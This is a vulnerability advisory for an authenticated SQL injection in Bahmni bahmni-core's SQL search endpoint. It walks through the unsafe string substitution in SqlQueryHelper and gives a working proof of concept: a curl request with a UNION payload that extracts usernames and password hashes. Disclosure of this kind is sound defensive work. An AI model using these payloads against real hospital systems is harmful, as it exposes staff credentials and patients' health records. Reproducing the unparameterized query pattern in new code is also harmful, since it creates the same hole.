https://github.com/Bahmni/bahmni-core

Title: Authenticated SQL Injection via additionalParams.tests in SQL Search Endpoint

Package: Bahmni/bahmni-core

Affected Versions: v1.3.0

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N

CWE: CWE-89 -- Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')


## GitHub Advisory

### Summary
The Bahmni SQL search endpoint (`/openmrs/ws/rest/v1/bahmnicore/sql`) accepts an `additionalParams` request parameter whose `tests` field is injected directly into stored SQL query strings without parameterization. Any authenticated user can supply a crafted `additionalParams` value to inject arbitrary SQL into queries that contain the `${testName}` placeholder, including multiple queries shipped by default with Bahmni.

### Details
The vulnerable code is in `bahmnicore-api/src/main/java/org/bahmni/module/bahmnicore/util/SqlQueryHelper.java` in the `parseAdditionalParams` method (lines 72-82):

```java
String parseAdditionalParams(String additionalParams, String queryString) {
    String queryWithAdditionalParams = queryString;
    try {
        AdditionalSearchParam additionalSearchParams = new ObjectMapper().readValue(additionalParams, AdditionalSearchParam.class);
        String test = additionalSearchParams.getTests();
        queryWithAdditionalParams = queryString.replaceAll("\\$\\{testName\\}", test);
    } catch (IOException e) {
        log.error("Failed to parse Additional Search Parameters.");
        e.printStackTrace();
    }
    return queryWithAdditionalParams;
}
```

The `tests` field from the JSON-parsed `additionalParams` request parameter is passed to `replaceAll`, which substitutes `${testName}` in the query template with the attacker-supplied string verbatim. The substitution happens before the query is handed to `transformIntoPreparedStatementFormat` and `PreparedStatement`, so the injected content bypasses parameterization entirely.

The same file contains a `escapeSQL` static method for sanitizing SQL strings, but it is never called in `parseAdditionalParams`.

The `constructPreparedStatement` method triggers the vulnerable path at line 49-51:

```java
if (params.get("additionalParams") != null && params.get("additionalParams") != null) {
    finalQueryString = parseAdditionalParams(params.get("additionalParams")[0], queryString);
}
```

The `additionalParams` value is taken directly from the HTTP request parameter map (passed in from `SqlSearchController.search`):

```java
// SqlSearchController.java
public List<SimpleObject> search(@RequestParam("q") String query, HttpServletRequest request) throws Exception {
    return sqlSearchService.search(query, request.getParameterMap());
}
```

Multiple SQL query templates installed by default use `${testName}`. For example, `bahmnicore-omod/src/main/resources/V1_97_PatientSearchSql.sql` installs the global property `emrapi.sqlSearch.highRiskPatients` with:

```sql
cn.name IN (${testName})
```

An attacker targeting this query can pass:

```
additionalParams={"tests":"'x') OR 1=1 -- "}
```

which transforms the fragment to:

```sql
cn.name IN ('x') OR 1=1 -- )
```

Additional queries using `${testName}` are installed by V1_90, V1_91, V1_94, and V1_97 migrations.

The endpoint has no privilege annotation beyond `BaseRestController` authentication, meaning any logged-in user (including patients with portal access) can reach it.

Affected files:
- `bahmnicore-api/src/main/java/org/bahmni/module/bahmnicore/util/SqlQueryHelper.java`, lines 72-82 (root cause)
- `bahmnicore-omod/src/main/java/org/bahmni/module/bahmnicore/web/v1_0/controller/SqlSearchController.java`, lines 32-34 (entry point)
- `bahmnicore-omod/src/main/resources/V1_97_PatientSearchSql.sql`, line 198 (example affected query)

### PoC

Prerequisites: A running Bahmni instance with default migrations applied; credentials for any authenticated user.

```bash
# URL-encode the additionalParams JSON
# Injected payload turns the IN() filter into a tautology and
# injects a UNION to read usernames and password hashes.

PAYLOAD='{"tests":"'"'"'Non-Existent'"'"') UNION SELECT concat(username,'"'"':'"'"',password),'"'"'1'"'"','"'"'1'"'"','"'"'1'"'"','"'"'1'"'"' FROM users-- "}'

curl -s -u "clinician:Clinician123" \
  "http://TARGET/openmrs/ws/rest/v1/bahmnicore/sql?q=emrapi.sqlSearch.highRiskPatients&additionalParams=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD")"
```

Expected: the JSON response includes rows from the `users` table (username:password_hash pairs) mixed into the normal result set.

The injection works because `cn.name IN ('Non-Existent')` is prepended before the UNION, and the appended `-- ` comments out the closing `)`.

### Impact
Any authenticated Bahmni user -- including patients with patient-portal access -- can read arbitrary rows from the MySQL database. The OpenMRS `users` table stores bcrypt-hashed credentials for all clinical staff. The `obs`, `patient`, and `encounter` tables contain protected health information (PHI). An attacker who extracts password hashes can attempt offline cracking and then access clinical-staff accounts. Bahmni is commonly deployed in low-resource hospital settings where audit tooling may not detect the exfiltration.
